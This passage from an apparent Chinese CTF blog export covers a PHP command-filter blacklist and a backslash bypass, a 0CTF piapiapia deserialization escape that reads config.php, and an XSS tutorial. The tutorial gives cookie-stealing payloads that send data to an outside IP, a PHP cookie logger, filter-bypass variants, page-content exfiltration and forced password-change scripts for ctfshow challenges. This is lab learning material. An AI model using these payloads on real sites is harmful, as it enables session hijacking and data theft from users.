<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>))</span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li>与cat同种效果的指令很多，uniq是其中之一。</li>
<li>\可以绕过</li>
</ol>
</blockquote>
<p><img src="/CTF/Web/BUU-easy_web/04.png" alt="04"></p>
<p><strong>反斜杠</strong></p>
<p><img src="/CTF/Web/BUU-easy_web/06.png" alt="06"></p>
<blockquote>
<p>也就是说-&gt;在正则表达式中 三个反斜杠才代表过滤的是\，所以这里还可以通过\绕过</p>
<p>ls -&gt; l\s</p>
</blockquote>
<p><img src="/CTF/Web/BUU-easy_web/08.png" alt="08"></p>
<p>1.flag在根目录下，因为当前目录下没有flag（根目录下很常见）</p>
<p><img src="/CTF/Web/BUU-easy_web/07.png" alt="07"></p>
<p><strong>2.传参为什么要将空格表示为%20（url编码）      直接用空格是不对的。</strong> </p>
<p>3.php中对于\的输出 -&gt; 可以得到 奇数个报错，偶数个输出一半</p>
<p><img src="/CTF/Web/BUU-easy_web/05.png" alt="05"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-[OCTF 2016]piapiapia的Wp</title>
    <url>/CTF/Web/%5B0CTF%202016%5Dpiapiapia/</url>
    <content><![CDATA[<h2 id="0CTF-2016-piapiapia记录"><a href="#0CTF-2016-piapiapia记录" class="headerlink" title="[0CTF 2016]piapiapia记录"></a>[0CTF 2016]piapiapia记录</h2><p>打开题目网址，登录页面，像是sql注入，但是没测试到注入，用sqlmap也没跑出来（post）。扫后面，我自己没扫到，看Wp说是有<a href="http://www.zip文件/">www.zip文件</a> </p>
<p>-&gt; 访问并下载源码文件 -&gt; 用审计工具进行审计</p>
<p>-&gt; 首先是有一个 register.php文件 &#x3D;&gt; 注册页面，那自己随便注册一下 登录之后 跳转到了update.php 即 文件上传页面</p>
<p>-&gt; 经过测试，好像并没有文件上传漏洞</p>
<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;00.png)</p>
<p>进行代码审计：config.php文件中有<code>$flag</code>   那我们的目标的应该是读取config.php文件（<strong>文件读取漏洞</strong>）</p>
<p><strong>profile.php文件中存在：</strong></p>
<p>1.<code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> 很明显的文件读取函数</p>
<p>2.<code>$profile = unserialize($profile);</code>这里还有一个反序列化函数</p>
<p><strong>update.php文件中存在：</strong></p>
<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;01.png)</p>
<p>而update.php文件是我们上传文件的页面，$profile中的一些参数刚好对应上传文件页面的东西，最后还会进行序列化这个$profile</p>
<p>最后调用了 update_profile函数</p>
<p><strong>class.php文件中存在：</strong></p>
<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;02.png)</p>
<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;03.png)</p>
<p>我们在update.php文件内传参，然后可以跳转到profile.php文件内</p>
<p>在update.php内：class.php中user类的<code>update_profile($username, serialize($profile))</code> -&gt; 多次过滤，&#x3D;&gt; 调用父类mysql类的<code>parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);</code>  -&gt; 更新数据库中的数据 </p>
<p>在profile.php内：<code>$profile=$user-&gt;show_profile($username);</code> &#x3D;&gt; class.php中user类的 show_profile()函数 -&gt; 过滤 &#x3D;&gt; 回来profile.php内， 反序列化，然后进行读取$profile[‘photo’]的值，但photo在update.php文件内 后面有个md5 </p>
<p><code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code> 很明显无法直接传入</p>
<p>-&gt; 有个过滤函数，还有序列化和反序列化，很容易想到 逃逸</p>
<p>-&gt; 看一下过滤函数，有没有我们想要的 preg_match函数  </p>
<blockquote>
<p>$safe &#x3D; array(‘select’, ‘insert’, ‘update’, ‘delete’, ‘where’);<br>$safe &#x3D; ‘&#x2F;‘ . implode(‘|’, $safe) . ‘&#x2F;i’;<br>return preg_replace($safe, ‘hacker’, $string);</p>
</blockquote>
<p>where &#x3D;&gt; hacker   5 -&gt; 6 一个where可以换取一个字符，</p>
<p>-&gt;很明显，我们可以将读取config.php的内容放在 photo前面的那个里面，通过preg_match函数来进行字符串逃逸.</p>
<p>经过测试：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">        <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$profile</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;phone&#x27;</span> =&gt; <span class="string">&#x27;15839158474&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;158@qq.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;nickname&#x27;</span> =&gt; <span class="string">&#x27;&lt;?php  </span></span><br><span class="line"><span class="string">    function filter($string)&#123;</span></span><br><span class="line"><span class="string">        $safe = array(&#x27;</span>select<span class="string">&#x27;, &#x27;</span>insert<span class="string">&#x27;, &#x27;</span>update<span class="string">&#x27;, &#x27;</span>delete<span class="string">&#x27;, &#x27;</span>where<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">        $safe = &#x27;</span>/<span class="string">&#x27; . implode(&#x27;</span>|<span class="string">&#x27;, $safe) . &#x27;</span>/i<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">        return preg_replace($safe, &#x27;</span>hacker<span class="string">&#x27;, $string);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    $profile = array(</span></span><br><span class="line"><span class="string">        &#x27;</span>phone<span class="string">&#x27; =&gt; &#x27;</span><span class="number">15839158474</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;</span>email<span class="string">&#x27; =&gt; &#x27;</span><span class="number">158</span>@qq.com<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;</span>nickname<span class="string">&#x27; =&gt; &#x27;</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;photo&#x27; =&gt; &#x27;upload/21232f297a57a5a743894a0e4a801fc3&#x27;</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">    echo filter(serialize(<span class="subst">$profile</span>));&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;photo&#x27; =&gt; &#x27;upload/21232f297a57a5a743894a0e4a801fc3&#x27;</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string">    echo filter(serialize(<span class="subst">$profile</span>));</span></span><br></pre></td></tr></table></figure>

<p>payload：<code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p>
<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;05.png)</p>
<p>![](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;06.png)</p>
<p>![07](CTF&#x2F;Web&#x2F;[0CTF 2016]piapiapia&#x2F;07.png)</p>
<h4 id="收获的知识点："><a href="#收获的知识点：" class="headerlink" title="收获的知识点："></a>收获的知识点：</h4><p><strong>1.代码审计能力 初步会使用代码审计软件，将这么多的代码之间的关系理清了七七八八</strong></p>
<p><strong>2.反序列化字符串逃逸的构造能力。（1.闭合 2.调试）</strong></p>
<p><strong>3.文件上传漏洞：并不是能上传成功就说明有这个漏洞，</strong></p>
<p><strong>-&gt;我们需要能够去访问那个上传之后在的路径，</strong></p>
<p><strong>-&gt;并且上传的文件能够被Web容器解释执行（php被Aapche容器执行）,所以文件上传后所在的目录必须是Web容器能够覆盖到的</strong></p>
<hr>
<p>参考：<a href="https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/">https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/</a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Buu</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS学习</title>
    <url>/CTF/Web/XSS%20/</url>
    <content><![CDATA[<p>XSS又叫CSS(Cross Site Script)跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
<p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。	常见的输出函数有： echo printf print print_r sprintf die var-dump var_export.</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
<li>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。</li>
<li>诱使受害者打开受到攻击的服务器URL。</li>
<li>受害者在Web浏览器中打开URL，恶意脚本执行。</li>
</ul>
<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>反射型XSS：&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内	容），一般容易出现在搜索页面。一般是后端代码进行处理</p>
<p>存储型XSS：&lt;持久化&gt; 代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
<p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理。</p>
<p><strong>解释一些常用js代码的意思:</strong></p>
<p><code>onload</code>：事件处理程序，它会在网页加载完成后执行</p>
<p><code>document.cookie</code>：截取当前网页所有cooies，cookies是存储在用户浏览器上的小型数据片段，通常用于识别用户或保存的设置</p>
<p><code>location.href</code>：这会将当前网页的url重定向到 后面的地址</p>
<p><code>onerror</code>：当事件失败时会触发，<strong>配合img标签使用，不给图片地址（加载失败）&#x3D;&gt;触发onerror</strong></p>
<p><strong>Linux服务器关闭端口的一些常用指令：</strong></p>
<p><code>netstat -tuln</code></p>
<blockquote>
<p>-&gt; -t 是显示TCP协议的连接</p>
<p>-&gt; -u 是显示UDP协议的连接</p>
<p>-&gt; -l 是仅显示监听状态的连接</p>
<p>-&gt; -n 是以数字形式显示端口号和IP地址</p>
</blockquote>
<p><strong>Xss测试过滤：</strong></p>
<script>alert(1)</script>

<p>&lt;img alert(1)&gt;</p>
<body>alert(1)(</body>











<h4 id="Xss-payload"><a href="#Xss-payload" class="headerlink" title="Xss payload"></a><a href="https://www.freebuf.com/articles/web/340080.html">Xss payload</a></h4><p><strong>1.无过滤</strong></p>
<p><code>&lt;script&gt;location.href=&quot;http://(自己服务器的公网ip)/127.php(存放上述php代码的文件)?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
<p><code>&lt;script&gt; onload=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 127.php 创建在自己的站点的根目录下（payload中路径一样即可）</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);    <span class="comment"># a模式是追加模式（在文件末尾添加内容）</span></span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>2.过滤script</strong></p>
<blockquote>
<p><code>&lt;body onload=&quot;location.href=&#39;http://(自己服务器的公网ip)/127.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
<p><code>&lt;img src=&#39;&#39; onerror=location.href=&#39;http://39.103.98.109/127.php?cookie=&#39;+document.cookie&gt;</code></p>
<p><code>&lt;svg/**/οnlοad=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;</code></p>
<p><code>&lt;input/**/οnfοcus=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;</code></p>
<p><code>&lt;iframe/**/οnlοad=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;&lt;/iframe&gt;</code></p>
</blockquote>
<p><strong>存储型Xss payload：</strong></p>
<p><code>&lt;script&gt; onload=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
<p><strong>以ctfshow xss web328为例：</strong></p>
<p><code>&lt;script&gt;window.open(&#39;http://39.103.98.109:10086/&#39;+document.cookie)&lt;/script&gt;</code></p>
<p>题目：用户管理页面有信息（需要是admin用户    才可以看到flag）</p>
<p>思路：伪造SESSION admin用户</p>
<p><strong>1. 获取admin的SESSION：监听端口，用户注册，收到的信息里面的SESSION应该是admin的</strong></p>
<p><img src="/CTF/Web/XSS/328-00.png"></p>
<p><img src="/CTF/Web/XSS/328-01.png"></p>
<p><strong>2.抓包改SESSION 发包：这里面需要发两次包  每次收到的包都要改SESSION再发送</strong></p>
<p><img src="/CTF/Web/XSS/328-02.png"></p>
<p><img src="/CTF/Web/XSS/328-03.png"></p>
<h4 id="对于登录Cookie就失效的，无法伪造cookie："><a href="#对于登录Cookie就失效的，无法伪造cookie：" class="headerlink" title="对于登录Cookie就失效的，无法伪造cookie："></a>对于登录Cookie就失效的，无法伪造cookie：</h4><p><strong>法一：外带信息payload：（监听端口）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、innerHTML:从对象的起始位置到终止位置的全部内容,不包括Html标签。 innerText可替代innerHTML</span><br><span class="line">2、outerHTML:除了包含innerHTML的全部内容外, 还包含对象标签本身。</span><br></pre></td></tr></table></figure>

<p><code>&lt;script&gt;window.open(&#39;http://39.103.98.109:10086/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;/script&gt;</code></p>
<p>-&gt; <code>window.open</code> 打开新链接</p>
<p>-&gt; <code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;) </code>是一个通过类名查找元素的方法。它查找具有类名 ‘layui-table-cell’ 和 ‘laytable-cell-1-0-1’ 的元素，通常这是一种针对表格单元格的选择。</p>
<p>-&gt; <code>[1]</code> 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）</p>
<p><strong>法二：jQuery 选择器查找类和获取内容。</strong></p>
<p>jQuery选择器：用于选择HTML元素的强大工具，使得开发者能更好的获取页面中的元素.</p>
<p><code>&lt;script&gt;$(&#39;div.layui-table-cell.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if ((value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;) &gt; -1)&amp;&amp;(value.innerHTML.indexOf(&#39;script&#39;) === -1)) &#123;window.location.href = &#39;http://39.103.98.109:10086/&#39; +value.innerHTML;&#125;&#125;);&lt;/script&gt;</code></p>
<blockquote>
<p><code>$(&#39;div.layui-table-cell.laytable-cell-1-0-1&#39;).each(function(index, value) &#123; ... &#125;);</code></p>
<p>这是一个 jQuery 选择器，它查找具有类名 <code>&#39;layui-table-cell&#39;</code>、<code>&#39;laytable-cell-1-0-1&#39;</code> 的 <code>&lt;div&gt;</code> 元素集合，并对每个元素执行一个函数</p>
</blockquote>
<blockquote>
<p><code>.each(function(index, value) &#123; ... &#125;)</code></p>
<p>这是 jQuery 的遍历方法，它会遍历匹配的元素集合，并对每个元素执行包含在函数中的操作。在这里，函数接受两个参数，<code>index</code> 表示当前元素在集合中的索引，<code>value</code> 表示当前元素的引用。</p>
</blockquote>
<blockquote>
<p><code>if (value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;) &gt; -1) &#123; ... &#125;</code><br>这是在遍历中的条件语句，它检查当前元素的内容是否包含字符串 <code>&#39;ctfshow&#123;&#39;</code>。<code>value.innerHTML</code> 表示当前元素的 HTML 内容，<code>.indexOf(&#39;ctfshow&#123;&#39;)</code> 用于查找是否包含 <code>&#39;ctfshow&#123;&#39;</code>，如果包含则返回大于 -1 的索引，否则返回 -1</p>
</blockquote>
<blockquote>
<p><code>window.location.href = &#39;http://120.46.41.173:9023/&#39; + value.innerHTML;</code><br> 如果条件满足，即当前元素的内容包含 <code>&#39;ctfshow&#123;&#39;</code>，则执行这一行代码。它会将浏览器的当前位置重定向到一个新的 URL，这个 URL 是 <code>&#39;http://120.46.41.173:9023/&#39;</code> 加上当前元素的内容。这样就可以在浏览器中打开一个新的页面，新页面的 URL 包含了 <code>&#39;ctfshow&#123;&#39;</code> 以及其他内容。</p>
</blockquote>
<p><strong>法三：querySelector方法获取内容</strong></p>
<p>querySelector：DOM（文档对象模型）选择器，通过CSS选择器从文档中获取一个匹配的元素，返回的是文档中匹配指定的CSS选择器中的第一个元素。    querySelectorAll返回匹配的全部元素</p>
<p><strong>基本语法：</strong></p>
<ul>
<li><code>var element = document.querySelector(selector);</code></li>
</ul>
<p>-&gt; selector 是一个字符串，表示要查找的元素的CSS选择器</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过ID选择元素</span></span><br><span class="line">var elementById = document.querySelector(&#x27;#myId&#x27;);</span><br><span class="line"><span class="comment">// 通过类名选择元素</span></span><br><span class="line">var elementsByClass = document.querySelector(&#x27;.myClass&#x27;);</span><br><span class="line"><span class="comment">// 通过标签名选择元素</span></span><br><span class="line">var elementsByTagName = document.querySelector(&#x27;div&#x27;);</span><br><span class="line"><span class="comment">// 使用复杂的选择器，本题就是这种</span></span><br><span class="line">var complexSelector = document.querySelector(&#x27;div.container &gt; p<span class="punctuation">:</span>first-child&#x27;);</span><br></pre></td></tr></table></figure>

<p><code>\#top &gt; div.layui-container</code> 可以将所有源码都读了, 最方便</p>
<p><strong>web329 payload:</strong></p>
<p> <code>&lt;script&gt;var img = new Image();img.src = &quot;http://39.103.98.109:10086/&quot;+document.querySelector(&#39;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#39;).textContent;document.body.append(img);&lt;/script&gt;</code></p>
<blockquote>
<p>new Image() 创建新的图像元素对象，并将其分配给了img变量.</p>
</blockquote>
<blockquote>
<p>img.src &#x3D; “<a href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>“ +  document.querySelector(‘#top &gt; div.layui-container &gt;  div:nth-child(4) &gt; div &gt; div.layui-table-box &gt;  div.layui-table-body.layui-table-main’).textContent;</p>
<p>这个设置了src属性，通过多个部分拼接，首先是地址 + document.querySelector()DOM查询操作 + textContent是获取DOM元素文本的内容的属性</p>
</blockquote>
<blockquote>
<p>document.body.append(img) 这段代码将创建的图像元素img添加到页面的body元素内，这样图像就会被加载并显示在页面上.</p>
</blockquote>
<p><strong>web330 payload：</strong></p>
<p><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=1717&#39;;&lt;/script&gt;</code></p>
<p>思路：这个题可以修改密码，让admin管理员自己修改密码.</p>
<p>自己先注册号，在修改密码页面抓包，看是什么情况</p>
<p><img src="/CTF/Web/XSS/330.01.png"></p>
<p>很明显，有了路径，且变量p就是我们修改密码的变量</p>
<p>直接创建账号密码 都为 payload，让admin在点击我们的payload的时候，会自动修改密码为1717</p>
<p>这个时候我们直接以admin账号 密码为1717登录即可，</p>
<p>-&gt; 然后点击用户管理（这个时候也相当于点击我们的payload的，会发生页面跳转）</p>
<p>-&gt; 我们可以点击用户管理的同时打开源码或者抓包。</p>
<p><strong>web 331：</strong></p>
<p>这个题变成了post方法，改一改payload即可，其他与上一题一样：</p>
<p><code>&lt;script&gt;$.ajax(&#123;url:&quot;api/change.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;p&#39;:&#39;1717&#39;&#125;&#125;)&lt;/script&gt;</code></p>
<p>-&gt; 这段代码是用<code>jQuery</code>库中的 <code>$.ajax()</code> 函数发起的一个异步http请求。</p>
<p>-&gt; <code>$.ajax(&#123;&#125;)</code> 这是<code>jQuery</code>库提供的用于异步http请求的方法。它接受一个包含配置选项的对象作为参数</p>
<p>-&gt;<code>url:&quot;api/change.php&quot;</code> 这是请求的目标URL，请求被发送到目标URL，向服务器发送一个HTTP请求</p>
<p>-&gt;<code>mthod:&quot;POST&quot;</code> 这是表明 此次HTTP请求的方法是POST方法</p>
<p>-&gt; <code>data:&#123;&#39;p&#39;:&#39;1717&#39;&#125;</code> 这是参数及值</p>
<hr>
<p><a href="https://blog.csdn.net/Jayjay___/article/details/133375048">参考ctfshow web入门 xss payload</a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>漏洞学习</tag>
      </tags>
  </entry>
</search>
